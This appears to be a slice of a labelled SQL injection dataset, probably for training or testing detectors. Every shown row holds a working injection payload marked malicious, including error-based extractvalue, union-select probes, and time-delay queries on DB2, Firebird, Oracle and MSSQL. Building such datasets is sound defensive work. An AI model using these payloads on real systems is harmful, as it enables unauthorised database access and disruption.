row_index,payload_norm,label,sqli_type_hint
10470,"1 ) ) as pjjz where 8384 = 8384 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",1,
10471,"1' ) as uytv where 7875 = 7875 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
10472,"select * from generate_series ( 3341,3341,case when ( 3341 = 3072 ) then 1 else 0 end ) limit 1--",1,
10473,"-4407"" ) where 2055 = 2055 or elt ( 9714 = 5040,5040 ) --",1,
10474,"-5898"" ) ) as fycd where 7135 = 7135 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1,
10475,"1"" where 8978 = 8978 union all select null,null,null,null,null,null,null,null--",1,
10476,"1' ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
10477,"1' ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( 'stqq' = 'stqq",1,
10478,1%',1,
10479,"1 ) ) as vycb where 3524 = 3524 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
10480,"-3731' ) ) ) or elt ( 7540 = 1412,1412 ) and ( ( ( 'iwch' = 'iwch",1,
10481,"1"" ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""zzcd"" = ""zzcd",1,
